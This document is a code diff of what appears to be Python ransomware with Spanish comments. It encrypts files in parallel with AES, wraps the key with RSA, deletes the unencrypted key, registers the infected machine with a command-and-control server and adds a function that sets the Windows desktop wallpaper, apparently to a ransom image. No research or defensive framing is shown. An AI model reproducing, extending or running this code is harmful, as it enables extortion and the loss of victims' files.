@@ -1,4 +1,5 @@
 import os
+import ctypes
 import multiprocessing
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
@@ -9,11 +10,17 @@ import agent
 
 def load_aes_key():
     ruta_clave = os.path.abspath("aes_key.bin")
-    if os.path.exists(ruta_clave):
-        with open(ruta_clave, "rb") as clave_file:
-            return clave_file.read()
-    else:
-        raise FileNotFoundError(f"El archivo de clave no se encuentra en: {ruta_clave}")
+    with open(ruta_clave, "rb") as clave_file:
+        return clave_file.read()
+
+def encrypt_aes_key(aes_key):
+    gen_keys.generate_rsa_key()
+    with open("rsa_public.pem", "rb") as f:
+        rsa_public_key = RSA.import_key(f.read())
+    cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
+    aes_key_encrypted = cipher_rsa.encrypt(aes_key)
+    with open("aes_key_encrypted.bin", "wb") as f:
+        f.write(aes_key_encrypted)
 
 def encrypt_file(file, aes_key):
     try:
@@ -30,28 +37,18 @@ def encrypt_file(file, aes_key):
     except Exception as e:
         print(f"Error cifrando {file}: {e}")
 
-def encrypt_aes_key(aes_key):
-    gen_keys.generate_rsa_key()
-    with open("rsa_public.pem", "rb") as f:
-        rsa_public_key = RSA.import_key(f.read())
-    cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
-    aes_key_encrypted = cipher_rsa.encrypt(aes_key)
-    with open("aes_key_encrypted.bin", "wb") as f:
-        f.write(aes_key_encrypted)
-
 def encrypt_files():
     gen_keys.generate_aes_key()  # Generar clave simétrica
     aes_key = load_aes_key()  # Cargar la clave simétrica
     files = find_files()  # Obtener lista de archivos a cifrar
-    if not files or not isinstance(files, list):  # Verifica si la lista es válida
-        print("Error: No se pudo obtener la lista de archivos o está vacía.")
-        return
     with multiprocessing.Pool(processes=os.cpu_count()) as pool:
         pool.starmap(encrypt_file, [(file, aes_key) for file in files])
     print("Archivos cifrados correctamente.")
     encrypt_aes_key(aes_key)  # Se cifra la clave AES con RSA
     os.remove("aes_key.bin")  # Eliminar clave simétrica sin cifrar
-    agent.register_agent()  # Registrar agente en C2
+    change_background()
+    agent.register_agent()  # Registrar agente en comando y control
 
-if __name__ == "__main__":
-    encrypt_files()
+def change_background():
+    image_path = os.path.abspath("image/background.jpg")
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
